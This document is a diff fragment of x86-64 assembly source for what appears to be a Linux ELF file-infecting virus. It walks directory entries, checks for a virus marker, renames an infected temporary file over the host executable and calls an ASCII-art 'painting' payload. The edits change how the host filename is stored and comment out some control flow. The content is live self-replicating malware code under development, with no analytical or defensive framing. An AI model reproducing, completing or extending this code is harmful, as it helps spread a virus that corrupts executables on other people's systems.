@@ -389,17 +389,23 @@ check_file:
 		mov [r14 + 144], rax
 		xor r12, r12
 	.copy_filename:
+		;mov rsi, rdi
 		lea rdi, [r14 + 200] 
 		lea rsi, [rcx + r14 + 618]
-		.copy_filename_loop:
-			mov byte al, [rsi]
-			mov byte [rdi], al
-			inc rsi
-			inc rdi
-			cmp byte [rsi], 0x0
-			jne .copy_filename_loop
-		mov word [rdi], 0x5c00
+		mov qword [rdi], rsi
+		;.copy_filename_loop:
+		;	mov byte al, [rsi]
+		;	mov byte [rdi], al
+		;	inc rsi
+		;	inc rdi
+			;movsb
+			;cmp byte al, 0x0
+			;jne .copy_filename_loop
+		;	cmp byte [rsi], 0x0
+		;	jne .copy_filename_loop
+		;mov byte [rdi], 0x0
 		xor rax, rax
+		;mov byte [rdi], al
 		xor r12, r12
 		jmp get_vx_name
 	check_vx_name:
@@ -500,14 +506,14 @@ check_file:
 	;from previous filename save
 		;lea rdi, [r14 + 200]
 		;xor rax, rax
-		;mov rax, "\0"
+		;mov rax, "x\0"
 		;mov qword [rdi], rax
 
 		pop rcx
 		add cx, [rcx + r14 + 616] 		; linuxdirent.d_reclen
 		cmp qword rcx, [r14 + 500]
 		jl check_file
-		jmp painting
+		;jmp painting
 	painting:
 	call payload
 		db 0x21,0x21,0x21,0x21,0x21,0x21,0x21,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x21,0x21,0x21,0x27,0x27,0x27,0x27,0x21,0x21,0x21,0x21,0x21,0x21,0x6f,0x6f,0x6f,0x6f,0x6f,0x6f,0x6f,0x6f
@@ -951,7 +957,7 @@ frankenstein_elf:
 		syscall
 	.rename_temp_to_host:		
 		lea rdi, [r14 + 0x800]			;name of temp file in rdi
-		lea rsi, [r14 + 200]			;original name of host file in rsi
+		mov rsi, qword [r14 + 200]			;original name of host file in rsi
 		mov rax, 0x52 					;SYS_RENAME
 		syscall
 fin_infect:
